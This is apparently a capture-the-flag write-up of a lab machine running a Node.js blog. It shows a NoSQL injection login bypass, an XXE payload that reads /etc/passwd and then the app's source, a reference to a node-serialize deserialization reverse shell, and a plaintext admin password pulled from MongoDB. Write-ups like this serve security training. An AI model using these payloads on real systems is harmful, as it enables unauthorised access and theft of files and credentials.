# Enumration

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## NoSQL Injection at Login-Page 

### Burp Request
```text
POST /login HTTP/1.1
Host: 10.10.11.139:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 50
Origin: http://10.10.11.139:5000
Connection: close
Referer: http://10.10.11.139:5000/login
Upgrade-Insecure-Requests: 1

{"user": "admin", "password": {"$ne": "onepiece"}}
```

> [NoSQL Injection Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass)


### Response On Uploading PHP Rev-Shell

```text
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 144
ETag: W/"90-v0DoTdXwQk7iInwC6sdbQSWTk3E"
Date: Sun, 16 Jan 2022 13:01:02 GMT
Connection: close

Invalid XML Example: 
<post>
	<title>Example Post</title>
	<description>Example Description</description>
	<markdown>Example Markdown</markdown>
</post>
```

### Testing Custom XML file
Upload the below XML file to test for **XXE** Vulnerability
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

<post>
        <title>Example Post</title>
        <description>Example Description</description>
        <markdown>&xxe;</markdown>
</post>
```
**And It was Success !!**

### Sending JSON data with syntax error
On Sending JSON data with syntax error Site reveal some File, as we can see in the Response below:
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Unexpected end of JSON input<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at parse (/opt/blog/node_modules/body-parser/lib/types/json.js:89:19)<br> &nbsp; &nbsp;at /opt/blog/node_modules/body-parser/lib/read.js:121:18<br> &nbsp; &nbsp;at invokeCallback (/opt/blog/node_modules/raw-body/index.js:224:16)<br> &nbsp; &nbsp;at done (/opt/blog/node_modules/raw-body/index.js:213:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/opt/blog/node_modules/raw-body/index.js:273:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (events.js:412:35)<br> &nbsp; &nbsp;at endReadableNT (internal/streams/readable.js:1334:12)<br> &nbsp; &nbsp;at processTicksAndRejections (internal/process/task_queues.js:82:21)</pre>
</body>
</html>
```

 #### We can conclude that the Website **root** directory is **`/opt/blog`**

# Source Code Read
Gonna try to read the source code using the above **XXE** vulnerability , which is 
**`/opt/blog/server.js`** 
> `server.js` is common file in `NODE` application

### SOURCE CODE :

From the Source Code in Function **`authenticated`**
```js
function authenticated(c) {
    if (typeof c == 'undefined')
        return false

    c = serialize.unserialize(c)

    if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex')) ){
        return true
    } else {
        return false
    }
}
```

This line implies the use of `Serialization` 
```text
c = serialize.unserialize(c)
```

## User

Getting the Reverse Shell by exploiting the **`Node.js Serialization`** as explained in this Blog:
+ [Exploiting Node.js Serialization](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

We got shell as user **admin** getting into  **/home**  we can't get into our home directory neither we can read files
But since we are the owner of the  **admin**  directory we can change permissions:
```shell
admin@nodeblog:/home$ ls -al
ls -al
total 16
drwxr-xr-x 1 root  root   10 Dec 27 15:12 .
drwxr-xr-x 1 root  root  180 Dec 27 16:41 ..
drw-r--r-- 1 admin admin 220 Jan  3 17:16 admin
admin@nodeblog:/home$ cat admin/user.txt
cat admin/user.txt
cat: admin/user.txt: Permission denied
admin@nodeblog:/home$ cat admin/user.txt
cat admin/user.txt
cat: admin/user.txt: Permission denied
admin@nodeblog:/home$ chmod +x admin
chmod +x admin
admin@nodeblog:/home$ cd admin
```

## Getting Password for Admin user
**Mongodb** was running on on system and we can find **admin** user password in it from **blog** database under **users** collection
```text
{ "_id" : ObjectId("61b7380ae5814df6030d2373"), "createdAt" : ISODate("2021-12-13T12:09:46.009Z"), "username" : "admin", "password" : "IppsecSaysPleaseSubscribe", "__v" : 0 }
``` 
